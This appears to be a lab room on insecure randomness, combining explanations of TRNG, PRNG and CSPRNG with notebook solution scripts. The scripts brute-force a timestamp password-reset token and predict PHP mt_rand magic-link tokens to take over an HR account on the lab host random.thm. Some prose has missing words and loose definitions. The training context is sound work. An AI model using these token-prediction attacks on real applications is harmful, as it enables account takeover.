Insecure randomness occurs when web applications use predictable or poorly generated random values, making them vulnerable to attacks. While randomness is essential for securing tokens, session , and cryptographic keys, insecure implementation can allow attackers to exploit these predictable values to bypass authentication, hijack sessions, or even decrypt sensitive data.

In this room, we will explore techniques to identify and exploit vulnerabilities caused by insecure randomness. This will provide you with the knowledge to assess and enhance the security of web applications by ensuring proper random number generation practices. 

Learning Objectives

﻿Throughout this room, you will gain a comprehensive understanding of the following key concepts:

    Understanding insecure randomness
    Type of random number generators
    Weak or Insufficient  
    Predictable seeds during token generation

Learning Prerequisites

An understanding of the following topics is recommended before starting this room:

    Protocols and Servers
    Top 10 - 2021

Connecting to the Machine

You can start the virtual machine by clicking the Start Machine button attached to this task. You may access the VM using the AttackBox or your VPN connection. Later in the room, we will use a vulnerable application to perform the exercise practically and familiarise ourselves with various attack vectors. Please wait 1-2 minutes after the system boots completely to let the auto scripts run successfully. 

You can access the web app by visiting the URL http://random.thm:8090/case/ but first, you must add the hostname in your OS or AttackBox.
How to add hostname (click to read)

    If you are connected via or the AttackBox, you can add the hostname random.thm by first opening the host file, depending on your host operating system.
        Windows:  C:\Windows\System32\drivers\etc\hosts
        Ubuntu or AttackBox: /etc/hosts
    Open the host file and add a new line at the end of the file in the format: MACHINE_IP random.thm
    Save the file and type http://random.thm:8090/case/ in the browser to access the website.

Let's begin.

In this section, we will understand the fundamental concepts surrounding randomness and its role in security:
Randomness

Randomness refers to the lack of pattern or predictability in data, making it an essential component in secure systems.Image of three colorful dice showing different numbers. In cryptography, true randomness ensures an attacker cannot predict values such as keys, tokens, and nonces. We will explore how randomness is generated and the distinction between True Random Number Generators (TRNG) and Pseudorandom Number Generators (PRNG).

represents the amount of randomness or unpredictability in a system and is often used to assess the security of cryptographic keys, tokens, or random values. Higher indicates greater uncertainty, making it more difficult for attackers to predict or guess the values, which is essential for secure cryptographic operations. Low can lead to weak security, increasing the risk of attacks like brute-forcing or token prediction. 
Cryptographic Keys

Cryptographic keys are secret values used in algorithms to encrypt and decrypt data, ensuring confidentiality, , and authentication. They are critical components in symmetric and asymmetric encryption methods and must be securely generated and managed to prevent unauthorised access. The strength of a cryptographic key depends on its length and randomness. Image of a key representing token or secret key.
Session Tokens and Unique Identifiers

Session tokens and unique identifiers are used to maintain user sessions and track interactions in web applications. They must be securely generated with sufficient randomness and uniqueness to prevent token prediction and session hijacking. Proper management and protection of these tokens are essential to ensure secure user authentication and authorisation.
Seeding

Seeding refers to providing an initial value, known as a seed, to a secure cryptographic function to generate a sequence of random-looking numbers. While these secure functions produce numbers that appear random, the sequence is entirely determined by the seed, meaning the same seed will always result in the same sequence.
﻿This section will explore the different types of RNGs, emphasising their characteristics and use cases.
True Random Number Generator (TRNG)

TRNGs generate randomness by relying on unpredictable physical phenomena like thermal noise or radioactive decay. Since these generators stem from natural events, they produce inherently random values. TRNGs are commonly used in highly sensitive cryptographic operations, such as generating the keys for algorithms like or . These keys are then used in tasks like encryption, digital signatures, and certificate creation, where unpredictability is crucial for security. However, TRNGs require specialised hardware and can be slower than other RNGs, making them less suitable for tasks requiring rapid number generation.

An image showing the true random number generator process starting from a Seed value and how it generated true random numbers.

As shown in the above figure, the basic workflow includes capturing a seeding value from a natural, unpredictable physical source. This value is then fed into hardware that performs a non-deterministic transformation to generate a sequence of truly random, unpredictable numbers. The output of TRNGs cannot be predicted or reproduced, making them ideal for high-security cryptographic operations.
Pseudorandom Number Generator (PRNG)

PRNGs, unlike TRNGs, generate random numbers algorithmically based on an initial seed value. While they may appear random, they are deterministic, meaning the same seed will always produce the same sequence of numbers. PRNGs are faster and more efficient than TRNGs and are suitable for applications that quickly need large quantities of random numbers, like simulations or gaming. However, since they are algorithmic, predictability becomes a risk if an attacker can deduce the seed or its generation method.

We will examine the two primary types of PRNGs, statistical and cryptographic PRNGs, focusing on their differences and specific applications.

Statistical PRNG

Statistical PRNGs are designed to produce numbers that pass statistical randomness tests, meaning the numbers appear random and lack obvious patterns. These generators are widely used in non-security applications such as simulations, statistical sampling, and gaming, where randomness is required but not in a security-critical context. However, statistical PRNGs are deterministic by nature, meaning the same seed value will always produce the same sequence of numbers. This predictability makes them unsuitable for cryptographic tasks where unpredictability is paramount. 

Cryptographically Secure PRNG (CSPRNG)

A CSPRNG is a form of PRNG designed for cryptographic purposes, where randomness must be unpredictable and resistant to attack. Unlike statistical PRNGs, CSPRNGs produce computationally infeasible outputs to reverse-engineer, even if some of the output or internal state is known. CSPRNGs are critical in security-sensitive applications, including encryption key generation, session tokens, and secure random number generation for protocols. These generators must meet stringent requirements to ensure their output cannot be predicted, providing strong protection against cryptographic attacks. While they may be slower than statistical PRNGs due to additional security measures, they are essential for ensuring the and security of cryptographic operations.

In the next task, we will explore how an attacker can exploit vulnerabilities in PRNG functionality to predict or manipulate supposedly random values.

In [ ]:
import requests
import sys

# Function to brute force the reset token
def brute_force_token(username, start_timestamp):
    url = "http://random.thm:8090/case/reset_password.php"
    
    # Try tokens within a range of -5 minutes
    for i in range(-600, 0):
        current_timestamp = start_timestamp + i
        token = f"{username}{current_timestamp}"
        params = {'token': token}
        
        response = requests.get(url, params=params)
        
        # Check if the token is valid
        if "Invalid or expired token." not in response.text:
            print(f"Correct token identified: {token}")
            return token
        else:
            print(f"Tried token: {token} (Invalid)")
    
    print("No valid token found in the given range.")
    return None


username = "master"
start_timestamp = 1774644020

brute_force_token(username, start_timestamp)

In [ ]:
import base64
import zlib

class MT19937:
    def __init__(self, seed: int):
        self.mt = [0] * 624
        self.index = 624
        self.mt[0] = seed & 0xFFFFFFFF
        for i in range(1, 624):
            self.mt[i] = (1812433253 * (self.mt[i - 1] ^ (self.mt[i - 1] >> 30)) + i) & 0xFFFFFFFF

    def twist(self):
        for i in range(624):
            y = (self.mt[i] & 0x80000000) + (self.mt[(i + 1) % 624] & 0x7FFFFFFF)
            self.mt[i] = self.mt[(i + 397) % 624] ^ (y >> 1)
            if y & 1:
                self.mt[i] ^= 0x9908B0DF
        self.index = 0

    def extract_number_32(self):
        if self.index >= 624:
            self.twist()
        y = self.mt[self.index]
        self.index += 1

        # tempering
        y ^= (y >> 11)
        y ^= (y << 7) & 0x9D2C5680
        y ^= (y << 15) & 0xEFC60000
        y ^= (y >> 18)
        return y & 0xFFFFFFFF

    def php_mt_rand(self):
        # PHP mt_rand(): 0..2147483647 (31-bit)
        return self.extract_number_32() >> 1


def php_seed(email: str, constant: int) -> int:
    crc = zlib.crc32(email.encode("utf-8")) & 0xFFFFFFFF
    return (crc + int(constant)) & 0xFFFFFFFF


def predicted_tokens(email: str, constant: int, n: int = 10):
    mt = MT19937(php_seed(email, constant))
    out = []
    for _ in range(n):
        num = mt.php_mt_rand()
        tok = base64.b64encode(str(num).encode()).decode()
        out.append((num, tok))
    return out


def find_constant_from_observed_token(email: str, observed_token: str, c_start: int, c_end: int):
    for c in range(c_start, c_end + 1):
        first_tok = predicted_tokens(email, c, 1)[0][1]
        if first_tok == observed_token:
            return c
    return None


if __name__ == "__main__":
    email = "magic@mail.random.thm"

    # Falls constant bekannt:
    constant = 1337
    print("[*] Tokens mit bekanntem constant:")
    for i, (num, tok) in enumerate(predicted_tokens(email, constant, 10), 1):
        print(f"{i:02d}. {num} -> {tok}")

    # Falls constant unbekannt, aber 1 beobachteter Token vorhanden:
    observed = "MTIzNDU2Nzg5"  # Beispiel
    c = find_constant_from_observed_token(email, observed, -100000, 100000)
    print("\n[*] Gefundener constant:", c)
    if c is not None:
        print("[*] Naechste Token-Prognose:")
        for i, (num, tok) in enumerate(predicted_tokens(email, c, 5), 1):
            print(f"{i:02d}. {num} -> {tok}")

In [ ]:
import base64
import requests
import zlib
from urllib.parse import quote_plus

# Nur HR testen
TARGET_EMAIL = "hr@mail.random.thm"
CONSTANT_CANDIDATES = [1337]   # Falls noetig: weitere Werte hier ergänzen, z.B. [1337, 1338, 1336]
N_TOKENS = 150


class MT19937:
    def __init__(self, seed: int):
        self.mt = [0] * 624
        self.index = 624
        self.mt[0] = seed & 0xFFFFFFFF
        for i in range(1, 624):
            self.mt[i] = (1812433253 * (self.mt[i - 1] ^ (self.mt[i - 1] >> 30)) + i) & 0xFFFFFFFF

    def twist(self):
        for i in range(624):
            y = (self.mt[i] & 0x80000000) + (self.mt[(i + 1) % 624] & 0x7FFFFFFF)
            self.mt[i] = self.mt[(i + 397) % 624] ^ (y >> 1)
            if y & 1:
                self.mt[i] ^= 0x9908B0DF
        self.index = 0

    def extract_number_32(self):
        if self.index >= 624:
            self.twist()
        y = self.mt[self.index]
        self.index += 1
        y ^= (y >> 11)
        y ^= (y << 7) & 0x9D2C5680
        y ^= (y << 15) & 0xEFC60000
        y ^= (y >> 18)
        return y & 0xFFFFFFFF

    def php_mt_rand(self):
        return self.extract_number_32() >> 1


def php_seed(email: str, constant: int) -> int:
    crc = zlib.crc32(email.strip().lower().encode()) & 0xFFFFFFFF
    return (crc + int(constant)) & 0xFFFFFFFF


def predicted_tokens(email: str, constant: int, n: int = 150):
    mt = MT19937(php_seed(email, constant))
    out = []
    for _ in range(n):
        num = mt.php_mt_rand()
        tok = base64.b64encode(str(num).encode()).decode()
        out.append((num, tok))
    return out


def request_magic_link(email: str):
    url = "http://random.thm:8090/case/magic_link_request.php"
    try:
        r = requests.post(url, data={"email": email}, timeout=8)
        return r.status_code, r.text[:200], "POST"
    except requests.RequestException:
        r = requests.get(url, params={"email": email}, timeout=8)
        return r.status_code, r.text[:200], "GET"


def try_magic_link_token(token: str):
    url = f"http://random.thm:8090/case/magic_link_login.php?token={quote_plus(token)}"
    r = requests.get(url, timeout=8)
    text = r.text.lower()

    invalid_markers = ["invalid", "expired", "wrong token", "error", "not valid"]
    positive_markers = ["logout", "dashboard", "welcome", "hr@mail.random.thm", "flag", "thm{"]

    has_invalid = any(m in text for m in invalid_markers)
    has_positive = any(m in text for m in positive_markers)
    is_valid = (not has_invalid) or has_positive

    return is_valid, r.status_code, url, r.text


req_status, req_preview, req_method = request_magic_link(TARGET_EMAIL)
print(f"[*] Trigger magic link for {TARGET_EMAIL} via {req_method}: status={req_status}")

found = False
for constant in CONSTANT_CANDIDATES:
    print(f"\n[*] Trying constant={constant}")
    candidates = predicted_tokens(TARGET_EMAIL, constant, n=N_TOKENS)

    for i, (_, tok) in enumerate(candidates, 1):
        ok, status, url, body = try_magic_link_token(tok)
        if i <= 10 or ok:
            print(f"  {i:03d}. status={status} token={tok} valid={ok}")

        if ok:
            print("\n[+] HIT")
            print("[+] constant:", constant)
            print("[+] token:", tok)
            print("[+] URL:", url)

            # Versuche Flag direkt zu extrahieren
            import re
            m = re.search(r"THM\{[^}]+\}", body, flags=re.IGNORECASE)
            if m:
                print("[+] FLAG:", m.group(0))
            else:
                print("[+] No direct THM{...} in body preview, open URL in browser.")

            found = True
            break

    if found:
        break

if not found:
    print("\n[!] No hit found.")
    print("[!] Increase N_TOKENS or add more values in CONSTANT_CANDIDATES.")

When discussing best practices for identifying and mitigating insecure randomness, it's important to address both pentesters and secure coders, as their perspectives and responsibilities differ. Here's a breakdown of the best practices for each:
Pentesters

    Identify Weak Randomness in Code: During code reviews or application assessments, look for the use of weak random number generators like mt_rand() or rand(), especially when they generate security-sensitive values like session tokens or password reset links.
    Reverse Engineer Predictable Tokens: Attempt to exploit predictable randomness by reverse-engineering the seed used in PRNGs. Tools like php_mt_seed can help pentesters demonstrate how predictable tokens (e.g., magic links) can be recreated. Test for weak or predictable seeds like timestamps, IP addresses, or user-specific values.
    Test Token Exhaustion: If Cryptographically Secure Pseudorandom Number Generators (CSPRNGs) are not used, run brute-force or replay attacks against generated tokens, session IDs, or other randomness-dependent features. Ensure that tokens are not guessable or predictable. 

Secure Code Developers

    Use Cryptographically Secure PRNGs: Always use CSPRNGs, such as random_bytes() or openssl_random_pseudo_bytes() in PHP or java.security.SecureRandom in Java. These CSPRNGs are designed to generate unpredictable values suitable for security-critical applications like session tokens, API keys, or password reset tokens. 
    Avoid Predictable Seed Values: Never use predictable values like the current timestamp, IP address, or process ID for seeding random number generators. These values can be easily guessed or reverse-engineered by attackers. Instead, use entropy from cryptographic sources or system-provided randomness (e.g., /dev/urandom in Linux).
    Regenerate Randomness for Every Critical Operation: Avoid reusing random values or seeds across multiple requests or users. Regenerate fresh randomness for each operation that requires secure tokens, such as session management, password resets, or magic links.
    Use Strong Algorithms for Key Generation: When generating cryptographic keys, always use secure key generation functions that derive keys from strong sources of . For example, in PHP, you can use openssl_pkey_new() for key generation, which relies on secure randomness. 

Through thorough testing techniques and secure coding practices, both pentesters and secure developers can ensure the elimination of vulnerabilities related to insecure randomness. 

In this room, we've explored the key aspects of insecure randomness, starting with an overview of its fundamental concepts. We then explored the differences between TRNG and PRNG, highlighting their importance in secure systems. Through practical exercises, we demonstrated how weak and predictable seed values can lead to severe vulnerabilities, such as account takeovers. Lastly, we examined the best practices for secure coders and pentesters, ensuring defence against insecure randomness. As we conclude, remember that awareness is key to safeguarding digital applications. Stay tuned for more exciting content related to advanced web-pentesting. 